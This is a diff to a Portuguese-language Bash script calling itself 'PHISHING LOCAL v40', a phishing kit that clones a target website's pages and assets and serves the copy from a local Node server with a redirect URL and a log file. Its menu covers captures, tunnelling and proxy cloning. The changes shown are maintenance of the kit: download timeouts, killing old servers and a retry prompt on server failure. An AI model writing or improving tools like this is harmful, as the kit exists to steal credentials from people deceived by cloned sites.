@@ -1,6 +1,6 @@
 #!/bin/bash
 # ============================================
-# 🎣 PHISHING LOCAL v39 - Clonador Profissional
+# 🎣 PHISHING LOCAL v40 - Clonador Profissional
 # 1 Phish 2 Capturas 3 Túnel 4 Histórico 5 Localhost 6 Link 7 Status 8 Parar 9 Proxy 0 Sair
 # ============================================
 
@@ -293,7 +293,8 @@ ENDSPA
         asset_url=$(echo "$asset_url" | sed 's|"||g')
         [ -z "$asset_url" ] && continue
         local asset_file="asset_${asset_count}_$(basename "$asset_url" | sed 's/[^a-zA-Z0-9._-]/_/g' | cut -c1-50)"
-        $curl_cmd -s -o "$SITE_DIR/$asset_file" "$asset_url" >> "$SCRIPT_DIR/curl.log" 2>&1
+        # Baixar asset com timeout curto (não travar em arquivos grandes)
+        timeout 10 $curl_cmd -s -o "$SITE_DIR/$asset_file" "$asset_url" >> "$SCRIPT_DIR/curl.log" 2>&1 || { echo -e "${YELLOW}  (timeout: $asset_url)${NC}"; }
         asset_count=$((asset_count + 1))
     done < "$SCRIPT_DIR/.assets_list_sorted"
     rm -f "$SCRIPT_DIR/.assets_list" "$SCRIPT_DIR/.assets_list_sorted"
@@ -357,7 +358,14 @@ ENDSPA
     fi
     echo -e "  ${GREEN}============================${NC}"
 
-    # Iniciar servidor (só matar o antigo se o download + substituição deram certo)
+    # Matar servidor antigo antes de iniciar o novo
+    pkill -9 -f "node.*server.js" 2>/dev/null
+    rm -f "$SCRIPT_DIR/.server.pid"
+    sleep 2
+    if command -v fuser &>/dev/null; then fuser -k "$port/tcp" 2>/dev/null; fi
+    sleep 1
+
+    # Iniciar servidor novo
     local my_ip=$(get_my_ip)
     REDIRECT_URL="$redirect_url" PORT="$port" SITE_DIR="$SITE_DIR" LOG_FILE="$LOG_FILE" node "$SCRIPT_DIR/server/server.js" > "$SCRIPT_DIR/server.log" 2>&1 &
     local pid=$!
@@ -368,13 +376,33 @@ ENDSPA
         echo -e "${GREEN}[OK] Servidor rodando! PID: $pid${NC}"
         echo -e "${GREEN}[OK] http://${my_ip}:${port}${NC}"
     else
+        # Verificar erro
+        local err=$(grep -i "error\|cannot\|denied" "$SCRIPT_DIR/server.log" 2>/dev/null | tail -1)
         echo -e "${RED}[ERRO] Servidor não subiu${NC}"
-        cat "$SCRIPT_DIR/server.log" 2>/dev/null
+        [ -n "$err" ] && echo -e "  ${RED}$err${NC}"
+        echo -e "  ${WHITE}Log: $SCRIPT_DIR/server.log${NC}"
         rm -f "$SCRIPT_DIR/.server.pid"
+        echo -n "  Tentar de novo? (s/n): "
+        read RETRY
+        if echo "$RETRY" | grep -qi "^s"; then
+            pkill -9 -f "node.*server.js" 2>/dev/null; sleep 2
+            REDIRECT_URL="$redirect_url" PORT="$port" SITE_DIR="$SITE_DIR" LOG_FILE="$LOG_FILE" node "$SCRIPT_DIR/server/server.js" > "$SCRIPT_DIR/server.log" 2>&1 &
+            pid=$!
+            echo "$pid" > "$SCRIPT_DIR/.server.pid"
+            sleep 3
+            if kill -0 "$pid" 2>/dev/null; then
+                echo -e "${GREEN}[OK] Servidor rodando! PID: $pid${NC}"
+                echo -e "${GREEN}[OK] http://${my_ip}:${port}${NC}"
+            else
+                echo -e "${RED}[ERRO] Falha novamente${NC}"
+                cat "$SCRIPT_DIR/server.log" 2>/dev/null
+                rm -f "$SCRIPT_DIR/.server.pid"
+            fi
+        fi
     fi
 
     echo ""
-    echo -e "${YELLOW}Pressione Enter para volver ao menu...${NC}"
+    echo -e "${YELLOW}Pressione Enter para voltar ao menu...${NC}"
     read dummy
 }
 
@@ -821,7 +849,7 @@ while true; do
     echo -e "  ██║     ██║  ██║██║███████║██║  ██║"
     echo -e "  ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝"
     echo ""
-    echo -e "  🎣 PHISHING LOCAL ${CYAN}v39${NC}"
+    echo -e "  🎣 PHISHING LOCAL ${CYAN}v40${NC}"
     echo ""
     echo "  ─────────────────────────────────────────"
     echo ""
@@ -863,7 +891,6 @@ while true; do
             read PROXY_CHOICE
             echo "$PROXY_CHOICE" | grep -qi "^[sy]" && local_proxy="y"
 
-            kill_old_server
             clone_site "$URL" "$REDIR" "$PT" "$local_proxy"
             ;;
         2) view_captures ;;
@@ -873,10 +900,7 @@ while true; do
         6) show_tunnel_link ;;
         7) show_status ;;
         8) stop_all; read ;;
-        9)
-            kill_old_server
-            do_proxy_clone
-            ;;
+        9) do_proxy_clone ;;
         0) stop_all; exit 0 ;;
         *) echo -e "${RED}Inválido!${NC}" ;;
     esac
